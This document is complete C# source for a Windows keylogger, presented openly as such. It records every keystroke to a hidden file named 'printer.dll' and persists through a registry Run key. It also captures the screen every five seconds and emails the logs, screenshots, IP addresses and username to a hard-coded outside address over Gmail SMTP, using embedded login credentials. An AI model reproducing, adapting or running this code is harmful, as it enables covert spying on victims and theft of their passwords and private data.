using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.CodeDom;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;
using System.Reflection;
using System.Drawing;
using System.Windows;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Net.Mime;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeystrokes = 0;

        static void Main(string[] args)
        {
            StartWithOS();
            StartTimer();
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + @"\printer.dll");
            if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if(keyState == 32769)
                    {
                        Console.Write((char) i + ",");
                        //2 store the strokes into a text file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i); 
                        }
                        numberOfKeystrokes++;
                   /*     if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }*/
                    }
                }
            }
        }
        static void SendNewMessage()
        {
            // sent content of the text file to external email address
            string foldername = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = foldername + @"\printer.dll";
            string logContents = File.ReadAllText(filePath);
            string emailBody = "";
            // create email message 
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailBody += "Address:" + address;
            }
            emailBody += "\n user: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host; 
            emailBody += "\ntime:" + now.ToString();
            emailBody += logContents;  
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
      
            MailMessage mailMessage = new MailMessage();
            //
            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
            DirectoryInfo image = new DirectoryInfo(directoryImage);
            foreach (FileInfo item in image.GetFiles("*.png"))
            {
                if (File.Exists(directoryImage + "\\" + item.Name))
                    mailMessage.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));

            }
            //
            mailMessage.From = new MailAddress("user10091999@gmail.com");
            mailMessage.To.Add("17520844@gm.uit.edu.vn");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true; 
            client.Credentials = new System.Net.NetworkCredential("user10091999@gmail.com", "USER10091999");
            mailMessage.Body = emailBody;
            client.Send(mailMessage);
         }
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\WIndows\\CurrentVersion\\Run");
            string keyvalue = "1";

            try
            {
                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var directory = System.IO.Path.GetDirectoryName(path);
             
                String ver = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
               
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", directory + "\\" + ver + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
            }

        }
        static void StartTimer()
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Console.WriteLine(DateTime.Now);
                    Thread.Sleep(captureTime);
                    CaptureScreen();
                    SendNewMessage();
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        // Region capture

        static string imagePath = "Image_";
        static string imageExtendtion = ".png";
        static int imageCount = 0;
        static int captureTime = 5000;
        static void CaptureScreen()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height,
                                            PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
             gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                         Screen.PrimaryScreen.Bounds.Y,
                                         0,
                                         0,
                                         Screen.PrimaryScreen.Bounds.Size,
                                         CopyPixelOperation.SourceCopy);
            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
            if(!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() +imageCount, imageExtendtion);
            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {

            }
            imageCount++;
         
          
        }
    }
}
